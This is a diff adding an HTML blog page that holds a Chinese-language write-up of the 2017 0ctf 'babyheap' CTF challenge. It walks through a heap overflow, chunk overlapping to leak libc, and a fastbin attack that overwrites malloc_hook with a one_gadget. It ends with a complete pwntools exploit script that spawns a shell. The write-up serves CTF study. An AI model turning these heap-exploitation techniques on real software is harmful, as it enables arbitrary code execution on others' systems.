@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="Fastbin - 2017 0ctf babyheap"/>
+
+
+
+
+
+
+
+
+    <link rel="alternate" href="/default" title="Boxer">
+
+
+
+
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1"/>
+
+
+
+<link rel="canonical" href="http://yoursite.com/2020/02/24/2017-0ctf-babyheap/"/>
+
+
+<meta name="description" content="每次看别人的Writeup对我来说都是一种折磨，所以这题我完全无参考，独立的解了出来。这种练习方式比直接看别人wp要有效的多，因为你知道每一个细节是怎么来的，而直接看wp会遗漏许多的细节，对独立解题能力锻炼也很有限。 wp只能作为一种思路指引，不应该一开始就看别人的exp，试图搞清楚每一个细节，这么做显然是照猫画虎，时间久了遇到问题就会习惯先找wp，而没有独立解题能力。 解完后我才看了其他人的wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastbin - 2017 0ctf babyheap">
+<meta property="og:url" content="http://yoursite.com/2020/02/24/2017-0ctf-babyheap/index.html">
+<meta property="og:site_name" content="Boxer">
+<meta property="og:description" content="每次看别人的Writeup对我来说都是一种折磨，所以这题我完全无参考，独立的解了出来。这种练习方式比直接看别人wp要有效的多，因为你知道每一个细节是怎么来的，而直接看wp会遗漏许多的细节，对独立解题能力锻炼也很有限。 wp只能作为一种思路指引，不应该一开始就看别人的exp，试图搞清楚每一个细节，这么做显然是照猫画虎，时间久了遇到问题就会习惯先找wp，而没有独立解题能力。 解完后我才看了其他人的wp">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/image/15824827390105.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15824827601457.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15824836790937.jpg">
+<meta property="article:published_time" content="2020-02-23T18:07:47.814Z">
+<meta property="article:modified_time" content="2020-02-24T15:59:02.423Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/image/15824827390105.jpg">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1"/>
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+    
+
+
+
+
+
+    
+
+
+
+
+
+    <title> Fastbin - 2017 0ctf babyheap - Boxer </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Boxer</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="https://github.com/songjianyang" target="_blank" rel="noopener">
+                            
+                            
+                                Github
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/Links">
+                            
+                            
+                                Links
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                
+            </ul>
+        
+    </nav>
+
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Fastbin - 2017 0ctf babyheap
+        
+      </h1>
+
+      <time class="post-time">
+          2020-02-24
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <p>每次看别人的Writeup对我来说都是一种折磨，所以这题我完全无参考，独立的解了出来。这种练习方式比直接看别人wp要有效的多，因为你知道每一个细节是怎么来的，而直接看wp会遗漏许多的细节，对独立解题能力锻炼也很有限。</p>
+<p>wp只能作为一种思路指引，不应该一开始就看别人的exp，试图搞清楚每一个细节，这么做显然是照猫画虎，时间久了遇到问题就会习惯先找wp，而没有独立解题能力。</p>
+<p>解完后我才看了其他人的wp，发现思路基本都一样，不过细节都不同，这时候就可以把别人好的解题思路学过来，变成自己的了:)</p>
+<h3 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h3><p>防御全开<br><img src="/image/15824827390105.jpg" alt=""></p>
+<p><img src="/image/15824827601457.jpg" alt=""></p>
+<ol>
+<li>Allocate，利用calloc分配chunk。</li>
+<li>Fill，根据索引向chunk里写内容，size可随意控制，造成堆溢出。</li>
+<li>Free，根据索引释放chunk。</li>
+<li>Dump，根据索引输出第2步写入的内容。</li>
+</ol>
+<p>通过head[索引]可以得到，所分配chunk的信息，是否使用，大小，和chunk的内存地址。<br><img src="/image/15824836790937.jpg" alt=""></p>
+<h3 id="Leak-libc"><a href="#Leak-libc" class="headerlink" title="Leak libc"></a>Leak libc</h3><p>先申请4个chunk，第一个用来堆溢出，修改后面的size之类的。第二个用来Dump数据，第三个是small bin大小，用来free后放入unsorted bin，这样就可以用第二个来Dump出unsorted bin的fd和bk。第四个是为了防止和topchunk合并。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">10</span>)</span><br><span class="line">allocate(<span class="number">10</span>)</span><br><span class="line">allocate(<span class="number">0x100</span>)</span><br><span class="line">allocate(<span class="number">0x100</span>)  //防止和topchunk合并，不是重点。</span><br></pre></td></tr></table></figure>
+
+<p>此时我们用chunk1通过堆溢出，将chunk2的size改成一个比较大的数，比如0x61，这时候chunk2就包含了chunk3的部分内存。（这个技巧是我独自想出来的，后来才知道叫chunk overlapping）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">24</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>) *<span class="number">11</span> + p64(<span class="number">0x100</span>) <span class="comment">#nextchunk size用于绕过free检测</span></span><br><span class="line">fill(<span class="number">0</span>,len(payload),payload)</span><br></pre></td></tr></table></figure>
+
+<p>因为我们后面要dump，但是现在chunk2的size在head上还是之前的10，所以要将它free掉，并重新分配，这样就head上就变成了0x61。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">allocate(<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>由于堆分配是用的calloc，分配后chunk里的内容都被清空了，所以我们要将chunk3的size给恢复过来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload2 &#x3D; &#39;\x00&#39;*24+p64(0x111)</span><br><span class="line">fill(1,len(payload2),payload2)</span><br></pre></td></tr></table></figure>
+
+<p>之后将chunk3 free掉，会进入unsorted bin，它的fd和bk会变成unsorted bin地址，然后打印chunk2，就泄露出了unsorted bin的地址。</p>
+<p>完整leak代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">    allocate(<span class="number">10</span>)</span><br><span class="line">    allocate(<span class="number">10</span>)</span><br><span class="line">    allocate(<span class="number">0x100</span>)</span><br><span class="line">    allocate(<span class="number">0x100</span>)</span><br><span class="line">    payload = <span class="string">'\x00'</span>*<span class="number">24</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">    payload += p64(<span class="number">0x0</span>) *<span class="number">11</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">    fill(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    allocate(<span class="number">80</span>)</span><br><span class="line">    payload2 = <span class="string">'\x00'</span>*<span class="number">24</span>+p64(<span class="number">0x111</span>)</span><br><span class="line">    fill(<span class="number">1</span>,len(payload2),payload2)</span><br><span class="line">    free(<span class="number">2</span>)         <span class="comment">#free unsorted bin</span></span><br><span class="line">    dump(<span class="number">1</span>)         <span class="comment">#打印 unsorted bin fd和bk</span></span><br><span class="line">    p.recvuntil(<span class="string">'\x7f\x00\x00'</span>)</span><br><span class="line">    unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">return</span> unsortedbin_addr</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="计算libc"><a href="#计算libc" class="headerlink" title="计算libc"></a>计算libc</h3><p>有了unsortedbin就可以计算出main_arena地址，然后就可以计算出libc基址，这个没啥好说的，千篇一律的流程，我用的CTF-WIKI里的通用代码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">unsortedbin_addr = leak()</span><br><span class="line">log.info(<span class="string">'unsortedbin addr: '</span>+ hex(unsortedbin_addr))</span><br><span class="line">unsortedbin_offset_main_arena = offset_bin_main_arena(<span class="number">0</span>)</span><br><span class="line">main_arena_addr = unsortedbin_addr - unsortedbin_offset_main_arena - <span class="number">40</span>   <span class="comment">#需要注意，这里本来不用减40，但算出来和我本地有差异，-40是为了调整偏移。</span></span><br><span class="line">libc_base = main_arena_addr - main_arena_offset</span><br><span class="line">log.info(<span class="string">'libc_base addr: '</span>+hex(libc_base))</span><br><span class="line">log.info(<span class="string">'main_arena addr: '</span>+hex(main_arena_addr))</span><br></pre></td></tr></table></figure>
+
+<h3 id="done"><a href="#done" class="headerlink" title="done"></a>done</h3><p>最后利用之前文章里提到的malloc_hook技巧，<a href="https://zero-day.cn/2020/02/23/malloc-hook/" target="_blank" rel="noopener">malloc hook</a>劫持chunk到malloc hook附近，从而写入one_gadget。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment">#chunk_A，为了填空，不是重点。</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment">#chunk_B</span></span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment">#chunk_C</span></span><br><span class="line">free(<span class="number">5</span>)         <span class="comment"># free chunk_C</span></span><br></pre></td></tr></table></figure>
+<p>为了方便讲解，我给它们加了编号。</p>
+<p>再申请3个chunk，chunk_C要0x60大小，因为fake_chunk的size是0x7f，<br>free掉chunk_C，利用chunk_B恢复它的size，并将fd处写入fake_chunk。</p>
+<p>这样就形成了Double Free的效果，fd指向了fake_chunk，我们最后将它分配出来既可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = main_arena_addr - <span class="number">51</span></span><br><span class="line">payload4 = <span class="string">'\x00'</span>*<span class="number">24</span>+p64(<span class="number">0x71</span>) + p64(fake_chunk)</span><br><span class="line">fill(<span class="number">4</span>,len(payload4),payload4) <span class="comment"># chunk_B</span></span><br><span class="line">allocate(<span class="number">0x60</span>)      <span class="comment">#重新分配之前free的chunk_C</span></span><br><span class="line">allocate(<span class="number">0x60</span>)      <span class="comment">#分配fake_chunk</span></span><br></pre></td></tr></table></figure>
+
+<p>最后将one_gadget通过偏移写入malloc_hook</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">payload5 = <span class="string">'A'</span> * <span class="number">19</span> +  p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,len(payload5),payload5) <span class="comment">#fake_chunk</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment">#分配，触发one_gadget</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">    allocate(<span class="number">10</span>)</span><br><span class="line">    allocate(<span class="number">10</span>)</span><br><span class="line">    allocate(<span class="number">0x100</span>)</span><br><span class="line">    allocate(<span class="number">0x100</span>)</span><br><span class="line">    payload = <span class="string">'\x00'</span>*<span class="number">24</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">    payload += p64(<span class="number">0x0</span>) *<span class="number">11</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">    fill(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    allocate(<span class="number">80</span>)</span><br><span class="line">    payload2 = <span class="string">'\x00'</span>*<span class="number">24</span>+p64(<span class="number">0x111</span>)</span><br><span class="line">    fill(<span class="number">1</span>,len(payload2),payload2)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    dump(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\x7f\x00\x00'</span>)</span><br><span class="line">    unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">return</span> unsortedbin_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算libc</span></span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">unsortedbin_addr = leak()</span><br><span class="line">log.info(<span class="string">'unsortedbin addr: '</span>+ hex(unsortedbin_addr))</span><br><span class="line">unsortedbin_offset_main_arena = offset_bin_main_arena(<span class="number">0</span>)</span><br><span class="line">main_arena_addr = unsortedbin_addr - unsortedbin_offset_main_arena - <span class="number">40</span></span><br><span class="line">libc_base = main_arena_addr - main_arena_offset</span><br><span class="line">log.info(<span class="string">'libc_base addr: '</span>+hex(libc_base))</span><br><span class="line">log.info(<span class="string">'main_arena addr: '</span>+hex(main_arena_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改fd为fake_chunk</span></span><br><span class="line">fake_chunk = main_arena_addr - <span class="number">51</span></span><br><span class="line">payload4 = <span class="string">'\x00'</span>*<span class="number">24</span>+p64(<span class="number">0x71</span>) + p64(fake_chunk)</span><br><span class="line">fill(<span class="number">4</span>,len(payload4),payload4)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将one_gadget 写入mallo hook</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">payload5 = <span class="string">'A'</span> * <span class="number">19</span> +  p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,len(payload5),payload5)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+            </div>
+          
+
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2012 -
+    
+    2020
+    <span class="footer-author">.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/henryhuang/hexo-theme-polarbearsimple" target="_blank" rel="noopener">Polar Bear Simple</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    
+
+  
+ 
+  </script>
+  </body>
+</html>
